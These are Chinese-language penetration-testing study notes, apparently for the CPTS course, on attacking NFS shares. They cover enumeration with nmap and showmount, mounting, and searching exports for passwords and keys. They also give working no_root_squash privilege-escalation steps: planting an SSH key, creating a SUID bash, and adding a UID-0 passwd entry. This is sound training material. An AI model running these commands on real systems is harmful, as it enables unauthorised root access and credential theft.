# 第 46 章 - NFS

## 標籤

- #cpts
- #chapter
- #nfs
- #linux
- #services

## 學習目標

- 理解 NFS export 設定與 root_squash / no_root_squash 的安全影響。
- 能用 showmount + nmap 列舉 exported shares。
- 能掛載 NFS 分享並分析內容與權限。
- 理解 no_root_squash 如何造成高危寫入風險。

---

## 理論基礎

```text
NFS（Network File System）：
  Unix/Linux 主要的網路檔案共享機制
  Port: 2049/tcp (NFS)、111/tcp (RPC portmapper)

Export 設定（/etc/exports）：
  /backup  *(rw,no_root_squash)    ← 危險：任何人可讀寫，root 不被壓縮
  /data    10.0.0.0/24(ro)         ← 較安全：限制來源，唯讀

root_squash（預設）：
  客戶端以 root 掛載 → 伺服器把 root 映射成 nobody（UID 65534）
  → 無法以 root 寫入高權限檔案

no_root_squash（危險）：
  客戶端以 root 掛載 → 保留 root 權限
  → 可寫入 SUID 二進位、修改 /etc/passwd、植入 SSH key
  → 可能造成本地提權

高價值 export 目標：
  /home/user/.ssh/  → 可放 authorized_keys → 無密碼 SSH
  /root/            → 直接存取 root 家目錄
  /etc/             → 修改 passwd/shadow/sudoers
  /var/www/html/    → 植入 WebShell
  /backup/          → 讀取備份資料
```

---

## 方法一：服務發現

```bash
# 掃描 NFS 相關埠
nmap -sV -p 111,2049 TARGET_IP
# 111 → RPC portmapper（NFS 服務發現需要）
# 2049 → NFS 主要服務埠

# NSE 腳本列舉
nmap --script nfs-showmount,nfs-ls,nfs-statfs -p 111,2049 TARGET_IP
# nfs-showmount → 列出 exported shares（等同 showmount -e）
# nfs-ls        → 列出 export 目錄的內容
# nfs-statfs    → 顯示各 export 的磁碟使用狀況
```

---

## 方法二：列舉 Exported Shares

```bash
# showmount：列出伺服器公開的 NFS export
showmount -e TARGET_IP
# -e → exports（列出 export 清單）
# 輸出範例：
# Export list for TARGET_IP:
# /backup   *           ← * 表示允許所有來源
# /home/admin 10.0.0.0/24  ← 限制特定網段

# 若 showmount 失敗，用 rpcinfo 確認 RPC 服務
rpcinfo -p TARGET_IP
# 列出所有透過 portmapper 註冊的 RPC 服務
# 確認 nfs / mountd 是否存在
```

---

## 方法三：掛載 NFS 分享

```bash
# 建立掛載點
mkdir -p /mnt/nfs_test

# 掛載 NFS export
mount -t nfs TARGET_IP:/backup /mnt/nfs_test
# -t nfs → 指定檔案系統類型為 NFS

# 若版本有問題，明確指定 NFS 版本
mount -t nfs -o vers=3 TARGET_IP:/backup /mnt/nfs_test
# vers=3 → 強制使用 NFSv3
mount -t nfs -o vers=4 TARGET_IP:/backup /mnt/nfs_test

# 列出掛載後的內容
ls -la /mnt/nfs_test/
# 注意：看 UID/GID 數字，若無對應使用者會顯示數字而非名稱

# 遞迴列出所有檔案
find /mnt/nfs_test -ls
# -ls → 類似 ls -l 格式顯示所有找到的檔案

# 用完卸載
umount /mnt/nfs_test
```

---

## 方法四：no_root_squash 利用（本地提權）

```bash
# 前提：確認 export 有 no_root_squash
cat /etc/exports   # 若能讀到伺服器設定
# 或從 showmount 結果推測

# 在攻擊機（需要 root 權限）掛載目標 export
mount -t nfs TARGET_IP:/home/victim /mnt/nfs_test

# 方法 A：植入 SSH 公鑰
mkdir -p /mnt/nfs_test/.ssh
echo "$(cat ~/.ssh/id_rsa.pub)" >> /mnt/nfs_test/.ssh/authorized_keys
chmod 600 /mnt/nfs_test/.ssh/authorized_keys
chmod 700 /mnt/nfs_test/.ssh
# 然後 SSH 登入目標主機
ssh victim@TARGET_IP

# 方法 B：建立 SUID shell（可在目標主機本地提權）
cp /bin/bash /mnt/nfs_test/bash_suid
chmod 4755 /mnt/nfs_test/bash_suid
# SUID bit = 4755：執行時以擁有者（root）身分運行
# 在目標主機執行：
# /tmp/bash_suid -p    # -p → 保留 SUID 權限

# 方法 C：修改 /etc/passwd（若 /etc 被 export）
# 先產生密碼 hash
openssl passwd -1 "hacked"
# 在 /mnt/nfs_test/passwd 加一行：
echo 'hacker:HASH:0:0::/root:/bin/bash' >> /mnt/nfs_test/passwd
# UID=0 → root 等級帳號
```

---

## 方法五：搜尋高價值內容

```bash
# 掛載後搜尋敏感檔案
find /mnt/nfs_test -name "*.conf" -o -name "*.bak" \
  -o -name "*.sql" -o -name "id_rsa" 2>/dev/null

# 找含密碼關鍵字的檔案
grep -r "password\|secret\|passwd" /mnt/nfs_test \
  --include="*.txt" --include="*.conf" --include="*.php" \
  2>/dev/null

# 找 SUID 二進位（若 export 是 / 或 /usr）
find /mnt/nfs_test -perm -4000 -ls 2>/dev/null
```

---

## 決策流程

```
nmap -p 111,2049 確認 NFS 服務
    ↓
showmount -e → 列出 export 清單
    ↓
export 設定分析：
  * 或 0.0.0.0/0 → 任何人可掛載
  no_root_squash → 掛載後有 root 寫入能力
    ↓
mount -t nfs TARGET:/export /mnt/test
    ↓
ls -la → 分析 UID/GID 與內容
    ↓
no_root_squash？
  → 是：植入 SSH key / SUID shell → 提權
  → 否：找可讀的備份/設定/憑證
```

---

## 速查表

```bash
# 列舉 export
showmount -e TARGET_IP
nmap --script nfs-showmount,nfs-ls -p 111,2049 TARGET_IP

# 掛載
mkdir /mnt/nfs && mount -t nfs TARGET_IP:/share /mnt/nfs

# no_root_squash → 植入 SSH key
echo "$(cat ~/.ssh/id_rsa.pub)" >> /mnt/nfs/.ssh/authorized_keys

# no_root_squash → SUID shell
cp /bin/bash /mnt/nfs/bash_suid && chmod 4755 /mnt/nfs/bash_suid

# 搜尋敏感內容
find /mnt/nfs -name "*.conf" -o -name "id_rsa" 2>/dev/null

# 卸載
umount /mnt/nfs
```

---

## 關聯筆記

- [[05-Volume-5-Common-Services-Index|Vol.5 - Attacking Common Services]]
- [[45-SMB|第 45 章 - SMB]]
